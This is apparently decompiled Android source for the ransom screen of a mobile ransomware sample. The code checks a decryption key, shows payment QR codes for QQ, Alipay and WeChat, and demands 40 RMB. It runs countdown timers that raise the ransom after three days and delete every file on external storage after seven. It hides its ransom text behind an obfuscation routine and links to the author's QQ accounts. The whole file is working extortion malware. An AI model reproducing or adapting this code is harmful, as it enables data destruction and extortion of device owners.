package com.android.tencent.zdevs.bah;

import android.annotation.SuppressLint;
import android.app.AlertDialog.Builder;
import android.content.ClipboardManager;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Message;
import android.os.StrictMode;
import android.os.StrictMode.ThreadPolicy;
import android.support.v4.app.Fragment;
import android.support.v4.media.TransportMediator;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import com.wThgSpyWhatsApp.R;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

@SuppressLint({"NewApi"})
public class MainFragment extends Fragment {
    ScrollView ScrollView;
    Button bt;
    TextView bt1;
    TextView bt2;
    TextView bt3;
    TextView bt4;
    Button checkPaymentButton;
    EditText ed;
    long fileLostTimeStamp;
    Button fz;
    TextView je;
    TextView jed;
    TextView jr;
    TextView lx;
    private Handler mHandler = new C01941();
    TextView nr1;
    TextView nr2;
    TextView nr3;
    TextView nr4;
    TextView nr5;
    long paymentRaisedTimeStamp;
    TextView sc;
    TextView scd;
    long timeStart;
    View view;
    TextView wb;
    TextView zfje;
    boolean f12;

    class C01941 extends Handler {
        C01941() {
        }

        public void handleMessage(Message message) {
            if (message.what == 1279525738 && MainFragment.this.f12) {
                MainFragment.this.f12 = false;
                Toast.makeText(MainFragment.this.getActivity(), "Decrypt complete!", 1).show();
                MainFragment.this.bt.setText("Decrypt complete");
                MainFragment.this.ed.setText("");
            }
        }
    }

    class C01962 implements OnClickListener {

        class C01951 implements Runnable {
            C01951() {
            }

            public void run() {
                Utils.GetFiles(MainActivity.externalStorageDirectory.toString(), MainActivity.hz, true);
                if (Utils.filesToEncrypt.size() == 0) {
                    Editor edit = MainFragment.this.getActivity().getSharedPreferences("XH", 0).edit();
                    edit.putInt("cjk", 1);
                    edit.commit();
                    MainFragment.this.mHandler.obtainMessage(1279525738).sendToTarget();
                    return;
                }
                Utils.deleteDir(MainActivity.externalStorageDirectory.toString(), MainFragment.this.ed.getText().toString(), 0, MainFragment.this.getActivity());
            }
        }

        C01962() {
        }

        public void onClick(View view) {
            if (MainFragment.this.f12) {
                Toast.makeText(MainFragment.this.getActivity(), "The decryption has already started! Please don't touch it!", 0).show();
            } else if (MainFragment.this.ed.getText().toString().equals(MainActivity.decryptKey)) {
                MainFragment.this.f12 = true;
                Toast.makeText(MainFragment.this.getActivity(), "The key is correct and the decryption begins!", 0).show();
                MainFragment.this.bt.setText("In decryption");
                new Thread(new C01951()).start();
            } else {
                Toast.makeText(MainFragment.this.getActivity(), "Key error!", 0).show();
            }
        }
    }

    class C01973 implements OnClickListener {
        C01973() {
        }

        public void onClick(View view) {
            ((ClipboardManager) MainFragment.this.getActivity().getSystemService("clipboard")).setText(MainFragment.this.wb.getText().toString());
            Toast.makeText(MainFragment.this.getActivity(), "Copy successful!", 0).show();
        }
    }

    class C01984 implements OnClickListener {
        C01984() {
        }

        public void onClick(View view) {
            MainFragment.this.startActivity(new Intent("android.intent.action.VIEW", Uri.parse("mqqwpa://im/chat?chat_type=wpa&uin=3135078046&version=1")));
            Toast.makeText(MainFragment.this.getActivity(), "Please send red envelopes and serial numbers to the authors!", 1).show();
        }
    }

    class C01995 implements OnClickListener {
        C01995() {
        }

        public void onClick(View view) {
            MainFragment.this.startActivity(new Intent("android.intent.action.VIEW", Uri.parse("mqqapi://card/show_pslcard?src_type=internal&version=1&uin=571012706&card_type=group&source=qrcode")));
            Toast.makeText(MainFragment.this.getActivity(), "Welcome to join us!", 1).show();
        }
    }

    class C02036 implements OnClickListener {

        class C02001 implements DialogInterface.OnClickListener {
            C02001() {
            }

            public void onClick(DialogInterface dialogInterface, int i) {
                MainFragment.this.ewm(R.drawable.wx);
            }
        }

        class C02012 implements DialogInterface.OnClickListener {
            C02012() {
            }

            public void onClick(DialogInterface dialogInterface, int i) {
                MainFragment.this.ewm(R.drawable.zfb);
            }
        }

        class C02023 implements DialogInterface.OnClickListener {
            C02023() {
            }

            public void onClick(DialogInterface dialogInterface, int i) {
                MainFragment.this.ewm(R.drawable.qq);
            }
        }

        C02036() {
        }

        public void onClick(View view) {
            new Builder(MainFragment.this.getActivity()).setTitle("Payment").setMessage("Please choose a payment method! ").setPositiveButton("QQ", new C02023()).setNegativeButton("Alipay", new C02012()).setNeutralButton("WeChat", new C02001()).show();
        }
    }

    class C02057 implements OnClickListener {

        class C02041 extends TimerTask {
            C02041() {
            }

            public void run() {
                MainFragment.this.ScrollView.fullScroll(TransportMediator.KEYCODE_MEDIA_RECORD);
            }
        }

        C02057() {
        }

        public void onClick(View view) {
            new Timer().schedule(new C02041(), 150);
        }
    }

    class DeleteFileCountDownTimer extends CountDownTimer {

        class C02061 implements Runnable {
            C02061() {
            }

            public void run() {
                Utils.deleteFile(MainActivity.externalStorageDirectory);
            }
        }

        public DeleteFileCountDownTimer(long millisInFuture, long countDownInterval) {
            super(millisInFuture, countDownInterval);
        }

        public void onFinish() {
            MainFragment.this.sc.setText("Time has come!");
            Toast.makeText(MainFragment.this.getActivity(), "Your file will be deleted!", 1).show();
            new Thread(new C02061()).start();
        }

        public void onTick(long j) {
            MainFragment.this.sc.setText(Utils.formatDuring(j));
        }
    }

    class payReminderCountDownTimer extends CountDownTimer {
        public payReminderCountDownTimer(long millisInFuture, long countDownInterval) {
            super(millisInFuture, countDownInterval);
        }

        public void onFinish() {
            MainFragment.this.zfje.setText("Please scan the code to pay 40RMB and then contact the author");
            MainFragment.this.je.setText("Time has come!");
        }

        public void onTick(long j) {
            MainFragment.this.je.setText(Utils.formatDuring(j));
        }
    }

    void ewm(int i) {
        ImageView imageView = new ImageView(getActivity());
        imageView.setImageResource(i);
        new Builder(getActivity()).setView(imageView).show();
    }

    public View onCreateView(LayoutInflater layoutInflater, ViewGroup viewGroup, Bundle bundle) {
        this.view = layoutInflater.inflate(R.layout.main, viewGroup, false);
        StrictMode.setThreadPolicy(new ThreadPolicy.Builder().permitAll().build());
        super.onCreate(bundle);
        this.wb = (TextView) this.view.findViewById(R.id.wb);
        this.bt = (Button) this.view.findViewById(R.id.bt);
        this.lx = (TextView) this.view.findViewById(R.id.lx);
        this.fz = (Button) this.view.findViewById(R.id.fz);
        this.checkPaymentButton = (Button) this.view.findViewById(R.id.check_payment_button);
        this.ed = (EditText) this.view.findViewById(R.id.ed);
        this.jr = (TextView) this.view.findViewById(R.id.jr);
        this.je = (TextView) this.view.findViewById(R.id.je);
        this.sc = (TextView) this.view.findViewById(R.id.sc);
        this.jed = (TextView) this.view.findViewById(R.id.jed);
        this.scd = (TextView) this.view.findViewById(R.id.scd);
        this.zfje = (TextView) this.view.findViewById(R.id.zfje);
        this.ScrollView = (ScrollView) this.view.findViewById(R.id.ScrollView);
        this.bt1 = (TextView) this.view.findViewById(R.id.bt1);
        this.bt2 = (TextView) this.view.findViewById(R.id.bt2);
        this.bt3 = (TextView) this.view.findViewById(R.id.bt3);
        this.bt4 = (TextView) this.view.findViewById(R.id.bt4);
        this.nr1 = (TextView) this.view.findViewById(R.id.nr1);
        this.nr2 = (TextView) this.view.findViewById(R.id.nr2);
        this.nr3 = (TextView) this.view.findViewById(R.id.nr3);
        this.nr4 = (TextView) this.view.findViewById(R.id.nr4);
        this.nr5 = (TextView) this.view.findViewById(R.id.nr5);
        this.zfje.setText(Utils.m9l("ៗគ៑៛ៗគ៑ឋៗគ៑ណៗគ៑៕ៗគ៑។ៗគ៑ផៗគរពៗគ៑ទៗគ៑ណៗគ៑៕ៗគរពៗគ៑៕ៗគ៑ភៗគ៑ផៗគ៑៕ៗគ៑ងៗគ៑ឋៗគ៑ភៗគរព៩ៗគ៑ងៗគ៑ទៗគ៑ណៗគ៑៕ៗគរពៗគ៑ធៗគ៑ងៗគ៑ផៗគរពៗគ៑ឮៗគ៑ឧៗគ៑កៗគរៈៗគរ៛ៗគរពៗគ៑័ៗគ៑ផៗគ៑ៈៗគរព៩ៗគ៑ឋៗគ៑៕ៗគរពៗគ៑ទៗគ៑ធៗគ៑ឋៗគ៑ភៗគរពៗគ៑ទៗគ៑ណៗគ៑៕ៗគរពៗគ៑ងៗគ៑ផៗគ៑ភៗគ៑៚ៗគរពៗគ៑ទៗគ៑៚៩ៗគ៑ផៗគ៑ទៗគ៑ដៗគ៑ឆ៩"));
        this.bt1.setText(Utils.m9l("។នហឱ៕ឪ៕឴៕ឯពង៖ឹ឴ឤ៖ឹឆឬ៖ឹគឪ៖ឨព៓៖។ហ៓៖៕឴ឥ៖ទគឨ៖៕ឰច៩"));
        this.bt2.setText(Utils.m9l("។នហឱ៖៖ៈខ៖។ធ័៖ទគឨ៖ៗ៑ភ៖។ធឩ៖ឹគ឵៕ឹឬុ៖ឪដឧ៖៕៑ថ៖។ហឫ៖៖៕ផ៖។ហឫ៩"));
        this.bt3.setText(Utils.m9l("៖៖ៈខ៖។ធ័៖ៗហប៖ឹឆ឴៩"));
        this.bt4.setText(Utils.m9l("៖ឩហឡ៖។ធ័៖នៈ្៕គ៑គ៩"));
        this.nr1.setText(Utils.m9l("ៗធរឮ៖ៗ៑ភ៖។ធឩ៖ឹគ឵៕ឹឬុ៖ឪដឧ៖៕៑ថ៕គៈយ៖ឹឰឧ៖ឹ឴ឱ៖ឹគឪ៖។ឤទ៖ធឰ៖៖ឪដឍ៕គរឳ៖ឌឨឹ៖ឩរ៌។នហហ៖ឨគផ៩៖។ហឧ៖ឪឬឪ៕ឺពភ៖ទគឨ៖ឹឆដ៖៕ឰច៖។ហឫ៖៖៕ផ។នហហ៕ឺឬឳ៖ឹឬិ៖។ណថ៖៕ឰច។នហហ៖៖ៈខ៖។ធ័៖ទគឨ៖ឹឆៗ៖។ធឩ៩៖ឪដឧ៖៕៑ថ៖៕឴ប៖៕឴ប៖ឹឰឦ៖នឤច៖ឯហណ៖ឨឬឋ៖ឪដន៖៕៕ណៗធរឮ៖ឨឰត៖ឨហ៓៖ទគឨ៖ឹឰឦ៕ឹដណ៖។ហដ៖។ហឫ៖ឯឤឡ៩៖៕ឤឱ៖ឹឆៗ៖។ធឩ៕គឰដ៖ឹឰឬ៖ឯ៕ហ៕ឹឬុៗគរឦៗធរឮ៖ឩហឬ៖៕឴ជ៖ឩឰ៑៖ៗឤភ៕គៈយ៖ឹឰឧ៖ៗឤធ៖ឯឆព។នហហ៖ឹគឪ៩៖ឪឬឪ៖ឨគព៕ឺ៕ត៕ឨៈយ៖ឹឆៗ៖។ធឩ៖ទគឨ៖ឯឨឥ៖ន៑្៖។ហឫ៖៕឴ឬ៖ឹ឴អ៖ឨពព។នហហ៖ឌឤឫ៖ឹឆៗ៖។ធឩៗគ៑៕ៗគ៑៑៩ៗគ៑៕ៗធរឳ៖ឹឆៗ៖។ធឩ៕ឪ៕ច៕ឺពឪៗធរឳ៕ឪ៕ច៕ឯឬ៚ៗធរឳ៖ឨហឯ៖នហឍ៖ឨឨឥៗធរឳ៖ៗ៑ភ៖។ធឩៗធរឳ៖ធ឴ឩ៖ឯឆប៩ៗធរឳ៖ធ឴ឩ៖ធណនៗគរឦៗធរឮ៖ឹគឪ៖ឪឤ឴៖ឹឬិ៖ឪឬឪ៖ឨគព៖៕ឰច៕ឺ៕ត៖ឹឆៗ៖។ធឩ៕ឺធឳ៕ឨពឧ៖ឹគ឵៖ឹឰឬ៖ទគឨ៩៖៕៕ណ៩"));
        this.nr2.setText(Utils.m9l("ៗធរឮ៖ឹគឪ៖ៗរ៖៖ឹ឴ឤ៖៕រអ៖៖រគ៕ឹឬឆ៖ទគឨ៖៕៕ណ៖ទហឥ៕ឺធឳ៖ឩរ៌។នហហ៖ឹឤព៖ឨឰៈ៕ឹឤង៖ឯរឌ៕គៈយ។នហហ៩៖ឪដឧ៖៕៑ថ៕ឹដ័៖ឨណឧ៖ឨគណ៖៖ដ្៖។ហឫ៖ឹហា។នហហ៖ឹគ៓៖ឌ឴៖៖ទគឨ៖ៗហប៖ឹឆ឴៕ឯ៕៌៖៖៕ផ៖ឹឰឦ៖ឹឆទ៖ឩ឴៕៩៖ឨឤឦ៖ឪឬ័។នហហ៖ឹឤព៕ឺឬឫ៖ឯ៑ឦ៖ឹគឪ៖ឩឬ឴។នហហ៖ឹគឪ៖ឪឬ័ៗគរឦៗធរឮ៖ឹគឪ៖ឹឰឧ៖ឪដឧ៖៕៑ថ៕ឹឬឰ៖៖រ៑៩៖ឹហា៖ឩរឪ។នហហ៖ៗហប៖ឹឆ឴៖។ហឈ៖ឨធឯ៖ឹ឴ឥ៖៕ឆឰ៖ឌដរ៖ឹឰឈ៖ឹឰឬ។នហហ៖។ហឫ៕ឹឬ឴ៗគរឦៗធរឮ៖ឨរឧ៖នឬ្៩៖ឹហា៖ឩរ៌៖ទដណ៕ឹដ័៖ឪដឍ៖ឹឰឫ៖ឹគឪ៕ឹឬឩ។នហហ៖ទដណ៕ឹដ័៖ៗហប៖ឹឆ឴៖ឨធឯ៖ឹ឴ឥ៖ឪដឍៗគរ៚៖ឪណយ៖។ហឬ៩ៗគរឦៗធរឮ៖ឨឰឍ៖ឹឰឧ៖ឹឤព៖ឪឬ័៕ឯណល៕ឹធឦ៕ឯព៕៖។ពៗ៖ៗហប៖ឹឆ឴៕ឹឬឱ៖៕ឨណ។នហហ៖។ឰឋ៖ឹឰឧ៖ធដៗ៖ឩឤជ៩។នហហ៖ឯរឹ៖ទគឨ៖ឪដឧ៖៕៑ថ៖ឹហា៖ឩរ៌។នហហ៖ៗហប៖ឹឆ឴៕ឪ៕ិ៕ឨពច៖ឪឨា៖ឯឆ៓៖ឹឆទ៖ឨឬឋ៕ឨៈយ៖។ពៗ៕ឯគឡ៩៖ឯរឌ៖។ឰឋៗគរឦៗធរឮ៖ទគឨ៖ឹឤព៕ឪគឹ៖ឹហា៖ឹឰឧ៖នឆិ៖។ឰឋ៖៕ឰច។នហហ៖ឩឬឭ៖។ដប៖៕៕ណ៕ឺឬ៖ៗធរឮ៕ឹឬឱ៩៖៕ឨណ៖ទគឨ៖។ហឱ៕ឯ឴ឆ៖។ពព៕គៈយ៖ឹឰឧ៖ឹ឴ឱ។នហហ៖ទគឨ៕ឹដ័៖។ដៗ៖។ឰឋ៕ឹឬុ៖ឹឤឪៗគរឦៗធរឮ៖ឨគផ៖។ហឧ៩៖ឪដឧ៖៕៑ថ៖ទគឨ៖។ណឤ៖។ហឫ៖ឨណណ៖ឪឨឫ៖ឹឨ឵៖៕ឬឆ៖ឪដឱ៕គៈយ។នហហ៖ឹឬិ៖៕ឆឯ៖ៗររ៖ឹគ៓៖ឹឆទ៖៕ឰចៗធរឮ៩៖ឪដឧ៖៕៑ថ៕គៈយ៖៕឴ឧ៖ឨគផ៖។ហឧ៖ឪឬឪ៕ឺពភ៖ទគឨ៖ឹឆដ៖៕ឰច៕ឹឬឩ៕ឨរា៕គៈយ៖ឨឬឈៗធរឮ៖៖ៈខ៖។ធ័៖ទគឨ៩៖ឪដឧ៖៕៑ថ៖ឨឬឋ៖។ហឫ៖ធដៗ៖ឩឤជ៩"));
        this.nr3.setText(Utils.m9l("ៗធរឮ៖ឹឤឰ៖ឩពទ៖ឪដឧ៖៕៑ថ៖ឪពឥ៖ឩហឬ៖ឨឤ៚៖ឌឆឥ៖ឨឬឋ។នហហ៕ឯ៕ង៖៕ហឫៗធរឫៗគ៑៕ៗគ៑ៈៗគ៑័ៗគ៑៛ៗគ៑ភ៩ៗគ៑ទៗគ៑ឨៗធរឤ៖ឨព្៖ធ៕័៖ឨធឧ។នហហ៕ឯ៕ទ៖ឪឬឪ៖ឨណទ៕ឹឨជ៕ឨពហ៖ៗ៑ឪ៖ឨណទ៕ឹឨជ៖ទគឨ៕ឨៈណ៖ឩគខ៖ឯហណ៩។នហហ៖ឯរអ៕ឯ៕ង៖៕ហឫៗធរឫៗគ៑៕ៗគ៑ៈៗគ៑័ៗគ៑៛ៗគ៑ភៗគ៑ទៗគ៑ឨៗធរឤ៖ធឨៈ៖ឨព៓៕ឨៈណ៖ឩគខ៖ឩឨឯ៖ឌឤឫ៩។នហហ៕ឯ៕ទ៖ឪឬឪ៖ឹឰ៛៖ឹឰឬ៖ឹឤព៖នឆុ៖ឹហា៕គរឯ៖ឹឤឰ។នហហ៖ឯរអ៖ឨគឱ៖៕ឰឆ៕ឹដឌ៖ឨឰៈៗគរឦៗធរឮ៕គរឯ៩៖ឹឤឰ៖នឆុ៕ឨរឳ៖ឨឬច៖ឯឆប៖៕ឰឈ៖ឨឤខ៕ឹដឌ៖ឨគឱ៖៕ឰឆ៖ឹឆ឴៖។ដឋ៖ឯ៕ហ៖ឨឬ៖៖ឨឰឹ៖ឩគឡ៖៕គឦៗធរឫៗគ៑៚៩ៗគ៑ខៗគរពៗគ៑៕ៗគ៑ភៗគ៑ផៗគ៑៕ៗគ៑ងៗគ៑ឋៗគ៑ឭៗធរឤ៖ឨព្៖ធ៕័៖ឨធឧ៖ឯរអ៖ឨឬ៖៖ឨឰឹ៖ឩគឡ៖ឪណយ៖ឨឰៗ៩៖ឪដឧ៕ឯ៕ង៖៕ហឫៗធរឫៗគ៑័ៗគ៑ៈៗគ៑ឋៗគ៑ឭៗធរឤ៖ឨព្៖ធ៕័៕ឺឬ៖៖ឯរអ៖ៗហប៖ឹឆ឴ៗគរឦៗធរឮ៕ឪ៕ិ៕ឨពច៩៖ទគឨ៖ឌដ៓៖។ឰប៖ឹឰឦ៖ឨឬភ៖ឌគឹ៖ឯហណ៖ឹគអ៖ឹឤអ៕គៈយ៖ឹឰឧ៕ឪ៕ិ៕ឨពច៖ៗហប៖ឹឆ឴។នហា៖៕ដឡ៖៖ៈណ៕ឺធឳ៩ៗគរឦ៖ឹឆ឴៖។ដឋ៖ឪឨិ៖ឹឆ឴៖។ដឋៗធរឳ៖ឹឆ឴៖។ដឋ៖ឹឬផ៖ឩឨងៗធរឳ៖ឹឆ឴៖។ដឋៗគ៑ចៗគ៑ច៖។ហឫ៖ឹឆដ៖៕ឰច៩ៗគរឦ៖ឹឆ឴៖។ដឋ៖ឌរឳ៖៕឴ត៖ឯឆប៖៕ឰឈ៖ឯរអ៖ធដៗ៕ឯ៕ង៖៕ហឫៗធរឫៗគ៑៕ៗគ៑ងៗគ៑ទៗគ៑ញៗគ៑័ៗគ៑ផៗគ៑ឆ៩ៗគរពៗគ៑តៗគ៑ភៗគ៑ទៗគ៑ណៗគ៑ឭៗធរឤ៖ឨព្៖ធ៕័៕ឺឬ៖ៗគរឦ៖ឹឆ឴៖។ដឋ៖ឌរឳ៖នឆ៕៖ឹគហ៖៕឴ត៖៕ហឳ៖។ដឋ៩៖ឹឆដ៖៕ឰច៩"));
        this.nr4.setText(Utils.m9l("ៗធរឮ៖ឯរន៖៕៑ឋ៖៖ធឤ៖ឹឆដ៖៕ឰច៖នឆុ៖ឨឬច។នហហៗធរឫៗគ៑៚ៗគ៑ខៗគរពៗគ៑ងៗគ៑ឍៗគ៑ឋៗគ៑ឦៗធរឤ៕គរឯ៩៖៕ឰឺៗធរឫៗគ៑៚ៗគ៑ខៗគរពៗគ៑៕ៗគ៑ភៗគ៑ផៗគ៑៕ៗគ៑ងៗគ៑ឋៗគ៑ឭៗធរឤ៖ឨព្៖ធ៕័៕ឺឬ៖។នហហ៖ឨគឍ៖ឩឰង៩៖ទគឨ៖ឹឆដ៖៕ឰច៕ឺធឳ៕ឯហឬ៖។ឨឰ៖ឪធឮ៩"));
        this.nr5.setText(Utils.m9l("ៗធរឮ៖ឨធ។៖៕ៈឯ៖ទគឨ៖៕៑ឋ៖ឹឬផ៖ឪដឧ៖៕៑ថ៕គៈយ៖ឹឰឧ៖ឹ឴ឱ៖ឯរអ៖ៗហប៖ឹឆ឴៕គព៕៖ឪឬរ៖ឹហា៕គៈយ៖ឨឬឋ៩៖ឩឨឤ។នហហ៖ឹគឪ៕ឯ឴ធ៖ឨឰព៕ឺ៕ត៖ឹឆៗ៕ឹឤឋ៕ឺឬទ៖ឹឰឬ៖ឹឰឩ។នហហ៖ឯឆព៖ឨឨឱ៖ឹ឴ឤ៖ឹឆឬ៖ឹគអ៖ទដ៌៖ឌឨផ៩៖ឹឰឧៗធរឮ៖ឹឆៗ៕ឹឤឋ៖ៗឬក៖។ឤឬ៖ឨ៑ឰ៖។គឮ៖ឹឰគ៖ឩ឴ៗ។នហហ៖ឹឆៗ៕ឹឤឋ៕ឺឬទ៕ឯ឴ធ៖ឨឰព៕គរឯ៖៕ឰឺ៕ឯពញ៩៖ឨណ៚៕ឺធឳ៖ឹឰឧ៕ឺឬ៖។នហហ៖ឨ឴ឧ៖ឹ឴ឥ៖។ឤឱ៖នឆជ៖ឹឤឰ៖ឩពទ៖ឪដឧ៖៕៑ថ។នហហ៖ធៈឌ៕ឩគ្៖ទគឨ៕ឺធឳ៖ឩឬឯ៩៖ឹឰឧ៖ឨណឧ៕ឨ៑ល៖ឹគឪ៖ឹឰ៓។នហហ៕ឺឨង៖ឩឆ៓៖ធៈឤ៖ឩហ៓៖៕ឰច៩"));
        Typeface createFromAsset = Typeface.createFromAsset(getActivity().getAssets(), "ssspbahk.so");
        this.sc.setTypeface(createFromAsset);
        this.je.setTypeface(createFromAsset);
        SharedPreferences sharedPreferences = getActivity().getSharedPreferences("XH", 0);
        this.wb.setText(sharedPreferences.getString("bah", ""));
        this.lx.getPaint().setFlags(8);
        this.jr.getPaint().setFlags(8);
        if (sharedPreferences.getInt("sss", 0) == 1) {
            this.bt.setText("Decrypt");
            this.bt.setEnabled(true);
            this.ed.setFocusableInTouchMode(true);
        }
        if (sharedPreferences.getInt("cjk", 0) == 1) {
            this.bt.setText("Decrypt complete");
            Toast.makeText(getActivity(), "Decrypt complete!", 1).show();
        }
        try {
            URLConnection openConnection = new URL("http://biaozhunshijian.51240.com/").openConnection();
            openConnection.connect();
            Date date = new Date(openConnection.getDate());
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss SSS");
            Calendar instance = Calendar.getInstance();
            instance.setTime(simpleDateFormat.parse(simpleDateFormat.format(date)));
            this.timeStart = instance.getTimeInMillis();
        } catch (IOException e) {
            this.timeStart = System.currentTimeMillis();
        } catch (ParseException e2) {
            e2.printStackTrace();
        }
        try {
            if (sharedPreferences.getLong("sj", 0) == 0 || sharedPreferences.getLong("sj1", 0) == 0) {
                Editor edit = sharedPreferences.edit();
                edit.putLong("sj", this.timeStart + 604801000);
                edit.putLong("sj1", this.timeStart + 259201000);
                edit.commit();
                this.fileLostTimeStamp = 604801000;
                this.paymentRaisedTimeStamp = 259201000;
            } else {
                this.fileLostTimeStamp = sharedPreferences.getLong("sj", 0) - this.timeStart;
                this.paymentRaisedTimeStamp = sharedPreferences.getLong("sj1", 0) - this.timeStart;
            }
            this.jed.setText(new SimpleDateFormat("MM/dd/yyyy HH:mm:ss").format(Long.valueOf(sharedPreferences.getLong("sj1", 0))));
            this.scd.setText(new SimpleDateFormat("MM/dd/yyyy HH:mm:ss").format(Long.valueOf(sharedPreferences.getLong("sj", 0))));
            new DeleteFileCountDownTimer(this.fileLostTimeStamp, 1000).start();
            new payReminderCountDownTimer(this.paymentRaisedTimeStamp, 1000).start();
        } catch (Exception e3) {
        }
        this.bt.setOnClickListener(new C01962());
        this.fz.setOnClickListener(new C01973());
        this.lx.setOnClickListener(new C01984());
        this.jr.setOnClickListener(new C01995());
        this.checkPaymentButton.setOnClickListener(new C02036());
        this.ed.setOnClickListener(new C02057());
        return this.view;
    }
}
